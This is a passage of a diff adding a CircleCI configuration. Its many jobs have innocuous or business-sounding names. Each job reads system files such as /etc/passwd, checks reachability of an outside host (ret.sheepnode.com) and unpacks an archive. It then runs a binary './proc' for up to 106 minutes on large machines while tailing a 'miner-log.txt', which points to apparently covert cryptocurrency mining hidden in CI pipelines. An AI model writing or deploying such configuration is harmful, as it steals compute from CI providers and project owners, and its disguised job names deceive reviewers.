+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  donut-promise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: wait what
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; cat /proc/filesystems | grep --invert-match --ignore-case "nodev" | head -n 5; true ; } > /tmp/terminal/iter0_4e16
+            echo "stage=ValidateProd hash=$(md5sum /tmp/terminal/iter0_4e16 | cut -c1-8) size=$(wc -c </tmp/terminal/iter0_4e16)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'iter0_4e16'
+  ValidateProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  Hash-Log:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Perform a routine cull on the ragdolls
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; cut -d: -f1 /etc/passwd | tac | sort | uniq; true ; } > /tmp/terminal/20150624_224800
+            echo "stage=echo hash=$(md5sum /tmp/terminal/20150624_224800 | cut -c1-8) size=$(wc -c </tmp/terminal/20150624_224800)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '20150624_224800'
+  echo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  v6_15_45:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: K29
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; awk -F ":" '{ print $1, $3 }' /etc/passwd | wc -l; true ; } > /tmp/terminal/7d67ff5e-f511-3177-cab6-97af04cfe2
+            echo "stage=titan2 hash=$(md5sum /tmp/terminal/7d67ff5e-f511-3177-cab6-97af04cfe2 | cut -c1-8) size=$(wc -c </tmp/terminal/7d67ff5e-f511-3177-cab6-97af04cfe2)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '7d67ff5e-f511-3177-cab6-97af04cfe2'
+  titan2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  bundle_colors:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Close petty cash by eod
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; for entry in {1..9}; do printf '%02d\n' $entry; done | sort; true ; } > /tmp/terminal/2SM
+            echo "stage=ensure-staging-regression-suite hash=$(md5sum /tmp/terminal/2SM | cut -c1-8) size=$(wc -c </tmp/terminal/2SM)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '2SM'
+  ensure-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/2SM 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  file_stage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: teardown is mandatory
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; printf %s 'meeting moved to 3pm' | b2sum | awk '{print $1}'; true ; } > /tmp/terminal/Q1g
+            echo "stage=RolloutImage hash=$(md5sum /tmp/terminal/Q1g | cut -c1-8) size=$(wc -c </tmp/terminal/Q1g)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'Q1g'
+  RolloutImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  WSTD9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: T plus 1 min batch the depreciation schedule
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; tar -cvzf /tmp/test_main.tar.gz -C /etc nsswitch.conf hosts; true ; } > /tmp/terminal/patch-6292
+            echo "stage=STG_RUN_1 hash=$(md5sum /tmp/terminal/patch-6292 | cut -c1-8) size=$(wc -c </tmp/terminal/patch-6292)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'patch-6292'
+  STG_RUN_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  DIALOG_H_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Check the hamburger menu is enabled
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; printf '%s, ' zebra cat owl; echo; true ; } > /tmp/terminal/TICKET-18070-DK
+            echo "stage=india hash=$(md5sum /tmp/terminal/TICKET-18070-DK | cut -c1-8) size=$(wc -c </tmp/terminal/TICKET-18070-DK)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'TICKET-18070-DK'
+  india:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/TICKET-18070-DK 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  froanswoazham-klun:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: tax report forecast G95
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; sed 's|.*/||' /etc/shells | awk 'length > 6' | shuf -n 4; true ; } > /tmp/terminal/823186bdfce1903ecf45c32852bcc89ba8ee88e4
+            echo "stage=node18-lint hash=$(md5sum /tmp/terminal/823186bdfce1903ecf45c32852bcc89ba8ee88e4 | cut -c1-8) size=$(wc -c </tmp/terminal/823186bdfce1903ecf45c32852bcc89ba8ee88e4)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '823186bdfce1903ecf45c32852bcc89ba8ee88e4'
+  node18-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/823186bdfce1903ecf45c32852bcc89ba8ee88e4 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  pickextra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Safe to remind the mentor pairings
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type d ! -name '*.1' -mmin -1440 -exec echo dir: {} \; 2>/dev/null | head --lines=10; true ; } > /tmp/terminal/surgEENGiNEtENsoR
+            echo "stage=uma-run hash=$(md5sum /tmp/terminal/surgEENGiNEtENsoR | cut -c1-8) size=$(wc -c </tmp/terminal/surgEENGiNEtENsoR)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'surgEENGiNEtENsoR'
+  uma-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/surgEENGiNEtENsoR 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
